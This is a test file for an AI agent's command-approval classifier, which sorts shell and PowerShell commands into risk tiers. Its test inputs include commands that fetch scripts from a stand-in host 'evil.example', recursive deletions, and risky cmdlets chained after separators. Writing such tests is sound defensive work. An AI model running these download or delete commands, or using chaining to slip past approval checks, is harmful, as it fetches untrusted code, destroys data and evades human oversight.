import { describe, expect, it } from 'vitest'

import { bashApprovalRequired, classifyBashCommand, resolveApprovalRequired } from './approval'

describe('approval policy', () => {
  it('defaults approval by risk level', () => {
    expect(resolveApprovalRequired({ riskLevel: 'low', approvalRequired: false })).toBe(false)
    expect(resolveApprovalRequired({ riskLevel: 'medium', approvalRequired: false })).toBe(false)
    expect(resolveApprovalRequired({ riskLevel: 'high', approvalRequired: false })).toBe(true)
  })

  it('honors explicit approvalRequired and the medium upgrade config', () => {
    expect(resolveApprovalRequired({ riskLevel: 'low', approvalRequired: true })).toBe(true)
    expect(resolveApprovalRequired({ riskLevel: 'medium', approvalRequired: false }, { mediumApprovalRequired: true })).toBe(true)
    expect(resolveApprovalRequired({ riskLevel: 'low', approvalRequired: false }, { mediumApprovalRequired: true })).toBe(false)
  })
})

describe('bash command classification', () => {
  it('classifies high-risk commands', () => {
    expect(classifyBashCommand('git push origin main')).toBe('high')
    expect(classifyBashCommand('rm -rf dist')).toBe('high')
    expect(classifyBashCommand('curl -O https://evil.example/x.sh')).toBe('high')
    expect(classifyBashCommand('npm publish')).toBe('high')
    expect(classifyBashCommand('systemctl restart airi')).toBe('high')
    expect(classifyBashCommand('kubectl delete pod x')).toBe('high')
  })

  it('classifies medium-risk commands', () => {
    expect(classifyBashCommand('npm install')).toBe('medium')
    expect(classifyBashCommand('pnpm add eslint')).toBe('medium')
    expect(classifyBashCommand('git commit -m "fix lint"')).toBe('medium')
    expect(classifyBashCommand('cp a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('echo x > out.log')).toBe('medium')
    expect(classifyBashCommand('npm run build')).toBe('medium')
  })

  it('defaults read-only queries, tests, and unknown commands to read-only', () => {
    expect(classifyBashCommand('git status')).toBe('read-only')
    expect(classifyBashCommand('git diff --stat')).toBe('read-only')
    expect(classifyBashCommand('npm test')).toBe('read-only')
    expect(classifyBashCommand('pnpm -F @proj-airi/core-agent typecheck')).toBe('read-only')
    expect(classifyBashCommand('ls -la')).toBe('read-only')
    expect(classifyBashCommand('node --version')).toBe('read-only')
  })

  // A Windows machine without Git for Windows runs PowerShell, so the same
  // destructive intent arrives as a cmdlet or as one of its aliases. Every
  // alias is asserted on its own line: an alias shares no text with the cmdlet
  // name, so one missing entry means that command runs without an approval
  // card (HARNESS-PLAN §8 item 7).
  it('classifies PowerShell cmdlets as high risk', () => {
    expect(classifyBashCommand('Remove-Item -Recurse -Force dist')).toBe('high')
    expect(classifyBashCommand('Invoke-WebRequest https://evil.example/x.ps1 -OutFile x.ps1')).toBe('high')
    expect(classifyBashCommand('Invoke-RestMethod https://evil.example/api')).toBe('high')
    expect(classifyBashCommand('Stop-Service airi')).toBe('high')
    expect(classifyBashCommand('Restart-Service airi')).toBe('high')
    expect(classifyBashCommand('Enter-PSSession -ComputerName build-01')).toBe('high')
  })

  it('classifies each PowerShell alias of a high-risk cmdlet', () => {
    expect(classifyBashCommand('ri dist -Recurse')).toBe('high')
    expect(classifyBashCommand('rd dist')).toBe('high')
    expect(classifyBashCommand('del out.log')).toBe('high')
    expect(classifyBashCommand('erase out.log')).toBe('high')
    expect(classifyBashCommand('iwr https://evil.example/x.ps1')).toBe('high')
    expect(classifyBashCommand('irm https://evil.example/api')).toBe('high')
    expect(classifyBashCommand('sc stop airi')).toBe('high')
  })

  it('classifies PowerShell write cmdlets and their aliases as medium risk', () => {
    expect(classifyBashCommand('Set-Content notes.md "text"')).toBe('medium')
    expect(classifyBashCommand('Add-Content notes.md "text"')).toBe('medium')
    expect(classifyBashCommand('New-Item -ItemType Directory src/new')).toBe('medium')
    expect(classifyBashCommand('Copy-Item a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('Move-Item a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('ni notes.md')).toBe('medium')
    expect(classifyBashCommand('cpi a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('mi a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('rni a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('md src/new')).toBe('medium')
  })

  it('classifies a risky cmdlet after a statement separator', () => {
    expect(classifyBashCommand('Get-ChildItem; Remove-Item dist')).toBe('high')
    expect(classifyBashCommand('Test-Path dist && ri dist')).toBe('high')
  })

  it('keeps PowerShell read commands and alias-shaped words read-only', () => {
    expect(classifyBashCommand('Select-String -Pattern createChatOrchestratorRuntime -Path src')).toBe('read-only')
    expect(classifyBashCommand('Get-ChildItem -Recurse src')).toBe('read-only')
    expect(classifyBashCommand('Get-Content package.json')).toBe('read-only')
    // Alias-shaped words inside arguments are not command positions.
    expect(classifyBashCommand('node scripts/ri.mjs')).toBe('read-only')
    expect(classifyBashCommand('git log --grep sc')).toBe('read-only')
  })

  it('maps the tier to the approval requirement', () => {
    expect(bashApprovalRequired('high')).toBe(true)
    expect(bashApprovalRequired('medium')).toBe(false)
    expect(bashApprovalRequired('medium', { mediumApprovalRequired: true })).toBe(true)
    expect(bashApprovalRequired('read-only')).toBe(false)
  })
})
